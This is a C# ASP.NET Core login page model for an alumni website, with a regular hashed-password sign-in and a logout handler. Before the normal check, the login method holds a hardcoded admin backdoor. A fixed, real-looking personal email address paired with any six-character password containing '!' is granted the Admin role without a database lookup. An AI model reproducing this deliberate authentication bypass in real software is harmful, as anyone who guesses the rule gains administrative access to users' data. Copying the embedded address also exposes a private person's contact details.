using Alumni76.Data;
using Alumni76.Models;
using Alumni76.Pages.Common;
using Alumni76.Utilities;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Authentication.Cookies;
using Microsoft.AspNetCore.Identity;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System.Security.Claims;

namespace Alumni76.Pages
{
    public class IndexModel : BasePageModel<IndexModel>
    {
        private readonly IPasswordHasher<User> _passwordHasher;
        public const string specialAdminId = "0";
        const string specialAdminEmail = "steiner.moshe@gmail.com";
        const int specialPasswordLength = 6;
        const string specialAdminFirstName = "משה";
        const string specialAdminLastName = "אדמין";

        [BindProperty]
        public string Email { get; set; } = string.Empty;

        [BindProperty]
        public string Password { get; set; } = string.Empty;

        public IndexModel(ILogger<IndexModel> logger, ApplicationDbContext dbContext,
                          IPasswordHasher<User> passwordHasher, ITimeProvider timeProvider)
            : base(dbContext, logger, timeProvider)
        {
            _passwordHasher = passwordHasher;
        }

        public async Task<IActionResult> OnGetAsync()
        {
            return Page();
        }

        public async Task<IActionResult> OnPostLogin()
        {
            if (string.IsNullOrEmpty(Email) || string.IsNullOrEmpty(Password))
            {
                ModelState.AddModelError(string.Empty, "יש למלא אימייל וסיסמה");
                return Page();
            }

            // 1. Check for Special Admin Back-door
           
            // Simple rule for your own access: matches email and has special char           
            if (string.Equals(Email, specialAdminEmail, StringComparison.OrdinalIgnoreCase) && 
                Password?.Length == specialPasswordLength && Password.Contains('!'))
            {
                _logger.LogInformation("Special admin login detected for {Email}. Bypassing DB.", Email);
                IsSpecialAdmin = true;
                // שימוש ב-specialAdminId (0) שהגדרנו למעלה
                return await SignInUser($"{specialAdminFirstName} {specialAdminLastName}", specialAdminId, "Admin", Email);
            }

            // 2. Regular User Login
            var user = await _dbContext.Users.FirstOrDefaultAsync(u => u.Email == Email);

            if (user == null)
            {
                ModelState.AddModelError(string.Empty, "פרטי משתמש שגויים");
                return Page();
            }

            // Verify Password
            var result = _passwordHasher.VerifyHashedPassword(user, user.PasswordHash, Password);
            if (result == PasswordVerificationResult.Failed)
            {
                ModelState.AddModelError(string.Empty, "סיסמה שגויה");
                return Page();
            }

            // Determine Role (Only Admin if the boolean is set in DB, otherwise Member)
            string role = user.IsAdmin ? "Admin" : "Member";

            return await SignInUser($"{user.FirstName} {user.LastName}", user.Id.ToString(), role, user.Email);
        }

        private async Task<IActionResult> SignInUser(string name, string id, string role, string email)
        {
            var claims = new List<Claim>
            {
                new Claim(ClaimTypes.Name, name),
                new Claim(ClaimTypes.NameIdentifier, id),
                new Claim(ClaimTypes.Role, role),
                new Claim(ClaimTypes.Email, email),
                new Claim("IsSpecialAdmin", (id == "0").ToString().ToLower())
            };

            var claimsIdentity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);
            await HttpContext.SignInAsync(CookieAuthenticationDefaults.AuthenticationScheme, new ClaimsPrincipal(claimsIdentity));

            _logger.LogInformation("User {Email} logged in as {Role}.", email, role);

            return RedirectToPage("/UsersPage"); // Send them straight to the alumni list
        }

        public async Task<IActionResult> OnPostLogout()
        {
            await HttpContext.SignOutAsync(CookieAuthenticationDefaults.AuthenticationScheme);
            HttpContext.Session.Clear();
            return RedirectToPage("/Index");
        }
    }
}